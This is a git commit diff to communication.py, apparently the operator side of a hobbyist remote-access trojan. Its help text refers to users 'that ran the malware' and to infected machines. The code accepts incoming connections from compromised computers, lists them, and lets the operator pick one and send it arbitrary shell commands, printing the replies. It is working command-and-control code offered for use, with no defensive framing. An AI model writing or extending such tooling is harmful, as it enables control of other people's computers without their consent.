49e22c2e739777211f3829e94e38fed95c9da542
80dropz <153262187+80dropz@users.noreply.github.com>
2024-11-25 23:04:29 -0500

    Update communication.py

--- communication.py
+++ communication.py
@@ -6,12 +6,28 @@ user_connections = []
 user_names = []
 useramount = 0
 
+
+def mainmenu():
+    menu = input("HOME> ")
+    menu = menu.lower()
+    if menu == "help":
+        print("Connections | Will check the most recent connections and allow you to choose a user that ran the malware")
+        print("Connect | Will allow you to chose what computer to connect too")
+        mainmenu()
+    elif menu == "connections":
+        connectionpage()
+    elif menu == "connect":
+        handleconnections()
+    else:
+        print("Invalid command")
+        mainmenu()
+
 #handles all new connections and should repeatidly scan for new incoming connections
 def newconnection():
     global useramount
     useramount = useramount + 1 #adds one to the user amount
     userlist = client_socket.recv(1024).decode()
-    print(f"Connection received from {addr}")
+    print(f"Connection received{userlist}")
     user_names.append(userlist) #adds the user computer name to the lsit
     user_connections.append((client_socket)) #adds the user socket to the list in the same position that name is for simpliar access
     print(user_connections)
@@ -24,23 +40,21 @@ def handleconnections(*args):
     global client_socket
     #creates a constantly running connection
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((hostip, port))
-        print(f"Binding to {hostip} on port {port}")
         s.listen(5)
         client_socket, addr = s.accept() #will auto accept any incoming requests
         newconnection()
 
 
 #main menu function were you check your connected user's you have been infected
-def mainmenu():
-    for user in user_names:
-        print(f"{user}: -> {useramount}")
-    connectionbranch = int(input("enter the connection you want: "))
+def connectionpage():
+    for i in range(len(user_connections)):
+        print(f"{i + 1} --> {user_names[i - 1]}")
+    connectionbranch = int(input("CONNECTION> "))
     selected = connectionbranch - 1
     usersocket = user_connections[selected]
+    username = user_names[selected]
     print(usersocket)
-    communication(usersocket)  #runs the communication command which i fr dont even need but ill check some more things out
+    communication(usersocket, username)  #runs the communication command which i fr dont even need but ill check some more things out
 
 
 def handle_client(client_socket):
@@ -48,7 +62,7 @@ def handle_client(client_socket):
 
         data = client_socket.recv(1024)
         if not data:
-            print("Connection closed by client.")
+            print("ERROR connection closed ERROR")
             break
         print(f"Received from client: {data.decode()}") 
         client_socket.sendall(data) 
@@ -67,20 +81,23 @@ def server():
     port = 65432
     print(f"Server will listen on {hostip}:{port}")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#starts the socket
-    handleconnections() #runs the handel connections function
+    s.bind((hostip, port))
+    print(f"Binding to {hostip} on port {port}")
+    handleconnectionsthread = threading.Thread(target=handleconnections, args=(s,))
+    handleconnectionsthread.start()
 
-
-def communication(UserSelected):
+def communication(UserSelected, username):
     while True:
-        command = input("Enter a command to send to the client (or type 'exit' to close): ")
+        command = input(f"{username} COMMAND> ")
         if command.lower() == 'exit':
             print("Closing connection.")
             mainmenu()
+            break
         UserSelected.sendall(command.encode())
         print(f"Sent a command to {UserSelected}")
         response = client_socket.recv(1024)
         if not response:
-            print("No response from client.")
+            print("ERROR couldnt receive a response ERROR")
             break
         print(f"Client response: {response.decode()}")
     s.close()
